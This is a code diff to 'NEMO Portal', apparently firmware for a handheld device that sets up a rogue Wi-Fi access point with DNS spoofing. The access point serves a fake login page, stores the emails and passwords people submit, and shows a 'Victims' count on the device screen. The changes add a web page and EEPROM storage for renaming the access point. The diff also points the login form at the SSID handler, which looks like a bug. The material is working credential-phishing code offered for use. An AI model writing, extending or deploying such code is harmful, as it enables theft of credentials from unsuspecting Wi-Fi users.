@@ -31,7 +31,6 @@
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
 String capturedCredentialsHtml = "";
-String apSsidName = String(DEFAULT_AP_SSID_NAME);
 
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -48,21 +47,62 @@ void setupWiFi() {
   WiFi.softAP(apSsidName);
 }
 
+void setSSID(String ssid){
+  #if defined USE_EEPROM
+  Serial.printf("Writing %d bytes of SSID to EEPROM\n", ssid.length());
+  for(int i = 0; i < ssid.length(); i++) {
+    EEPROM.write(i + apSsidOffset, ssid[i]);
+    Serial.printf("%d:%d ", i+ apSsidOffset, ssid[i]);
+  }
+  EEPROM.write(apSsidOffset + ssid.length(), 0);
+  EEPROM.commit();
+  Serial.println("\ndone.");
+  #endif
+  apSsidName=ssid;
+  return;
+}
+
+void getSSID(){
+  String ssid="";
+  #if defined USE_EEPROM
+  if(EEPROM.read(apSsidOffset) < 32 || EEPROM.read(apSsidOffset) > 254){
+    Serial.println("SSID EEPROM Corrupt or Uninitialized. Using Defaults.");
+    apSsidName=DEFAULT_AP_SSID_NAME;
+    return;
+  }
+  for(int i = apSsidOffset; i < apSsidOffset + apSsidMaxLen; i++) {
+    int ebyte=EEPROM.read(i);
+    Serial.printf("%d:%d ", i, ebyte);
+    if(ebyte < 32 || ebyte > 254){
+      Serial.println("SSID: " + ssid);
+      apSsidName=ssid;
+      return;
+    }
+    ssid += char(ebyte);
+  }
+  #else
+    apSsidName=DEFAULT_AP_SSID_NAME;
+  #endif
+  return;
+}
+
 void printHomeToScreen() {
   DISP.fillScreen(BLACK);
   DISP.setSwapBytes(true);
-  DISP.setTextSize(2);
+  DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(TFT_RED, BGCOLOR);
-  DISP.setCursor(0, 10);
-  DISP.print("NEMO PORTAL");
+  DISP.setCursor(0, 0);
+  DISP.println("NEMO PORTAL");
+  DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
-  DISP.setCursor(0, 35);
+  DISP.printf("%s\n\n",apSsidName.c_str());
   DISP.print("WiFi IP: ");
   DISP.println(AP_GATEWAY);
-  DISP.printf("SSID: ");  //, apSsidName);
-  DISP.print(apSsidName);
-  DISP.println("");
-  DISP.printf("Victim Count: %d\n", totalCapturedCredentials);
+  DISP.println("Paths: /creds /ssid");
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.printf("Victims: %d\n", totalCapturedCredentials);
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
 String getInputValue(String argName) {
@@ -115,7 +155,7 @@ String index_GET() {
   String loginMessage = String(LOGIN_MESSAGE);
   String loginButton = String(LOGIN_BUTTON);
 
-  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
+  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/postssid' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");  
 }
 
 String index_POST() {
@@ -127,6 +167,18 @@ String index_POST() {
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
 #endif
   return getHtmlContents(LOGIN_AFTER_MESSAGE);
+}
+
+String ssid_GET() {
+  return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
+}
+
+String ssid_POST() {
+  String ssid = getInputValue("ssid");
+  Serial.println("SSID Has been changed to " + ssid);
+  setSSID(ssid);
+  printHomeToScreen();
+  return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
 }
 
 String clear_GET() {
@@ -150,6 +202,19 @@ void blinkLed() {
 }
 #endif
 
+void shutdownWebServer() {
+  Serial.println("Stopping DNS");
+  dnsServer.stop();
+  Serial.println("Closing Webserver");
+  webServer.close();
+  Serial.println("Stopping Webserver");
+  webServer.stop();
+  Serial.println("Setting WiFi to STA mode");
+  WiFi.mode(WIFI_MODE_STA);
+  Serial.println("Resetting SSID");
+  getSSID();
+}
+
 void setupWebServer() {
   Serial.println("Starting DNS");
   dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
@@ -169,6 +234,7 @@ void setupWebServer() {
     blinkLed();
 #endif
   });
+  
   Serial.println("Registering /creds");
   webServer.on("/creds", []() {
     webServer.send(HTTP_CODE, "text/html", creds_GET());
@@ -177,6 +243,17 @@ void setupWebServer() {
   webServer.on("/clear", []() {
     webServer.send(HTTP_CODE, "text/html", clear_GET());
   });
+  Serial.println("Registering /ssid");
+  webServer.on("/ssid", []() {
+    webServer.send(HTTP_CODE, "text/html", ssid_GET());
+  });
+  Serial.println("Registering /postssid");
+  webServer.on("/postssid", []() {
+    webServer.send(HTTP_CODE, "text/html", ssid_POST());
+    shutdownWebServer();
+    isSwitching=true;
+    current_proc=19;
+  });
   Serial.println("Registering /*");
   webServer.onNotFound([]() {
     lastActivity = millis();
@@ -184,15 +261,4 @@ void setupWebServer() {
   });
   Serial.println("Starting Webserver");
   webServer.begin();
-}
-
-void shutdownWebServer() {
-  Serial.println("Stopping DNS");
-  dnsServer.stop();
-  Serial.println("Closing Webserver");
-  webServer.close();
-  Serial.println("Stopping Webserver");
-  webServer.stop();
-  Serial.println("Setting WiFi to STA mode");
-  WiFi.mode(WIFI_MODE_STA);
 }
